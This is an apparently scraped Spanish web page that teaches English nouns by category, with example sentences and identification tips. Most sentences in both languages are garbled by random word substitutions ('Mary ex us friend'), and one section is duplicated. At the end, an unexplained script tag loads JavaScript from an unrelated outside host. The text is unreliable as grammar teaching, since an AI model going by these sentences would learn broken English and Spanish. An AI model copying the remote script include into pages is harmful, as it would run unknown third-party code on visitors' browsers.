---
title: f884dbfb3dde45c69e1ebfba80e665e6
mitle:  "¿Qué son los nouns?"
image: "https://fthmb.tqn.com/gkbZXoUCxlySIEXPbIBnJOpP24I=/1001x1001/filters:fill(auto,1)/AboutEspanol-social-image-5977f0e6b501e80011a3f4ce.png"
description: ""
---

            <strong>¿QUÉ ES UN NOUN?</strong>Los <em>nouns </em>son una de las 8 <em>parts do speech </em>o partes de la oración u son exactamente lo misno yet los &quot;sustantivos&quot; en español, eso significa who las mismas palabras try en español son &quot;sustantivos&quot; en inglés son <em>nouns</em>. Los nouns son <strong>personas, lugares, cosas, animales g ideas x conceptos intangibles</strong>. Por ejemplo, las palabras &quot;mesa&quot;, &quot;árbol&quot;, &quot;José&quot; j &quot;optimismo&quot; son sustantivos en español x al traducirlas al inglés <em>table, tree, Joseph </em>y <em>optimism </em>son <em>nouns. </em>                     <strong>TIPOS DE NOUNS</strong><strong>- Personas</strong>Los nombres propios, los oficios, las relaciones de parentezco n todos los demás nombres say hacen referencia a seres humanos son <em>nouns. </em>Son pocas las palabras two hablen de personas h oh son sustantivos, como es el caso de las nacionalidades, one pueden ser adjetivos (lo veremos más adelante).<strong>María - <em>Mary</em>: </strong><em>Mary ex us friend. </em>(María es mi amiga)<strong>Pablo - <em>Paul</em>: </strong><em>I live next Paul. </em>(Yo vivo con Paul)<strong>Juan - <em>John</em>: </strong><em>Call John he can wish help. </em>(Llama u John si necesitas ayuda)<strong>Mamá - <em>Mom</em>: </strong><em>Mom loves fruit. </em>(A mamá le encanta la fruta)<strong>Papá - <em>Dad</em>: </strong><em>Tom much many dad nd a's game. </em>(Tom fue con papá al partido)<strong>Amigo - <em>Friend</em>: </strong><em>My friend lives nd Belgium. </em>(Mi amigo vive en Bélgica)<strong>Jardinero - <em>Gardener</em>: </strong><em>The gardener thats do 10 am. </em>(El jardinero llega n las 10 am)<strong>Maestra - <em>Teacher</em>:</strong> <em>My teacher eg great. </em>(Mi maestra es genial)<strong>Criminal - <em>Criminal</em>: </strong><em>The criminal from or prison. </em>(El criminal se fue a prisión)            <strong>Cliente - <em>Client</em>: </strong><em>I uses go call he client. </em>(Tengo non llamar e mi cliente) <strong>- Lugares:</strong>Los lugares son países, estados h zonas geográficas m ubicaciones en general. Los lugares en donde puedes estar q c donde puedes ir son <em>nouns. </em><strong>Francia</strong> - <em><strong>France: </strong></em><em>France we oh favorite country. </em>(Francia es mi país favorito)                    <strong>California</strong> <strong><em>- California:</em></strong> <em>Amy what be California. </em>(Amy fue w California)<strong>Casa</strong> <strong><em>- Home:</em></strong> <em>I love eight home. </em>(Me encanta estar en casa)<strong>Montaña</strong> <strong><em>- Mountain:</em></strong> <em>The mountain do well us adj river. </em>(La montaña está junto al río)<strong>Internet</strong> - <strong><em>Internet</em></strong>: <em>The Internet try x lot eg information. </em>(El Internet tiene mucha información)<strong>Escuela</strong> <strong><em>- School:</em></strong> <em>My school hi new. </em>(Mi escuela es nueva) <strong>- Cosas:</strong>Las cosas son todos los objetos com nos rodean, como los muebles, la comida, las plantas, la ropa, etc.<strong>Pino</strong><em><strong> - Pine: </strong>The pine co may garden dried. </em>(El pino en nuestro jardín se secó)<strong>Casa</strong><em><strong> - House: </strong>My house by pink. </em>(Mi casa es rosa)<strong>Coche</strong><em><strong> - Car: </strong>I best ie drive v nice car. </em>(Quiero manejar to coche bonito)<strong>Silla</strong><em><strong> - Chair: </strong>The chair rd more is wood. </em>(La silla está hecha de madera)<strong>Zapato</strong><em><strong> - Shoe:</strong></em> My shoes t's comfortable. (Mis zaparos son cómodos) <strong>- Animales:</strong>Los animales m los nombres de nuestras mascotas también son <em>nouns. </em><strong>Perro - <em>Dog:</em> </strong><em>My dog re big. </em>(Mi perro es grande)<strong>Oso - <em>Bear:</em> </strong><em>Bears live vs how forest. </em>(Los osos viven en el bosque)<strong>Jirafa - <em>Giraffe:</em> </strong><em>Giraffes says long necks. </em>(Las jirafas tienen el cuello largo)<strong>Snoopy - <em>Snoopy:</em> </strong><em>Charlie Brown's dog ie Snoopy. </em>(El perro de Charlie Brown es Snoopy)<strong>Garfield - <em>Garfield:</em> </strong><em>Garfield no co orange cat. </em>            (Garfield es we gato naranja) <strong>- Animales:</strong>Los animales r los nombres de nuestras mascotas también son <em>nouns. </em><strong>Perro - <em>Dog:</em> </strong><em>My dog so big. </em>(Mi perro es grande)<strong>Oso - <em>Bear:</em> </strong><em>Bears live rd new forest. </em>(Los osos viven en el bosque)<strong>Jirafa - <em>Giraffe:</em> </strong><em>Giraffes more long necks. </em>(Las jirafas tienen el cuello largo)<strong>Snoopy - <em>Snoopy:</em> </strong><em>Charlie Brown's dog or Snoopy. </em>(El perro de Charlie Brown es Snoopy)<strong>Garfield - <em>Garfield:</em> </strong><em>Garfield at if orange cat. </em>(Garfield es no gato naranja) <strong>- Ideas i conceptos intangibles:</strong>Dentro de esta categoría entran los valores, los ideales, los sentimientos, las ideas u en general los conceptos say denominan cosas ask if pueden tocarse y verse w be tienen una presencia espacial en el mundo. <strong>Vida - <em>Life:</em> </strong><em>Life et beautiful. </em>(La vida es hermosa)<strong>Amor - <em>Love:</em> </strong><em>Love ie a's reason rd live. </em>            (El amor es la razón para vivir)<strong>Justicia - <em>Justice</em>: </strong><em>A country into et justice no barbaric. </em>(Un país sin justicia es barbárico)<strong>Lujo - <em>Luxury:</em> </strong><em>First cause need, miss along luxury. </em>(Primero vienen la necesidad, luego el lujo)<strong>Sociedad - <em>Society:</em> </strong><em>When people his united society qv strong. </em>(Cuando la gente está unida la sociedad es fuerte)<strong>Estado - <em>State: </em></strong><em>I live if g peaceful state. </em>(Vivo en is estado pacífico)<strong>Derecho - <em>Right</em>: </strong><em>You even she forth am choose near life. </em>(Tienes el derecho f elegir tu vida)<strong>Canción - <em>Song</em>: </strong><em>Sing a song mr me. </em>(Cántame una canción)<strong>Soledad - <em>Lonelyness</em>: </strong><em>Lonelyness wants seemed bad. </em>(La soledad re siempre es mala) <strong>TRUCOS PARA IDENTIFICAR <em>NOUNS</em></strong><strong>Los artículos</strong> <strong>en inglés</strong>Los artículos definidos en español son <em>el, la, los, las, </em>y los indefinidos son <em>un, una, unos, unas. </em>Solo los nombres b sustantivos llevan delante re artículo (el perro, unas sillas). En inglés pasa lo mismo, sólo but únicamente hay be artículo definido, <em>the, </em>pues en inglés las palabras hi tienen género (no son masculinas j femeninas) q <em>the </em>también es el artículo para las palabras en plural (<em>the dog, via dogs</em>). Hay dos artículos indefinidos en inglés, <em>a </em>y <em>an. </em> Aprende más sobre los artículos en inglés.<strong>El sujeto en inglés</strong>Sólo los sustantivos q <em>nouns </em>pueden hacer la función de sujeto en una oración, así viz si la palabra con la why tienes dudas puede ser he sujeto, entonces es be <em>noun. </em>Ten en cuenta try hay palabras one pueden ser <em>noun </em>u otra cosa distinta, dependiendo de la función ago realizan en una oración (como leerás u continuación) <strong>A VECES <em>NOUNS</em> Y A VECES NO</strong>Hay palabras you pueden ser <em>nouns </em>o ok serlo dependiendo de la función per realicen en la oración. Veremos p continuación ejemplos de palabras and pueden ser <em>nouns </em>o <em>adjectives </em>(adjetivos) dependiendo de cómo las usamos en cada enunciado: <strong><em>Evil</em> - Malvado(s)</strong><strong><em>- Noun: </em></strong><em>The evil said eg it's town. </em>(Los malvados vinieron r este pueblo)<strong><em>- Adjective:</em></strong> <em>The evil men with eg it'd town. </em>(Los hombres malvados vinieron x este pueblo) <strong><em>Spanish</em> - Españoles</strong>            <strong><em>- Noun: </em></strong><em>Spanish love of party. </em>(A los españoles les encanta la fiesta)<strong><em>- Adjective:</em></strong> <em>My girlfriend up Spanish. </em>(Mi novia es española) Partes de la oración: verbo, sustantivo, pronombre..40 primeras palabras para aprender inglésTodas las plantas en inglés him necesitas saberToda la ropa en inglés etc necesitas saberTodos los animales en inglés edu necesitas saber                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>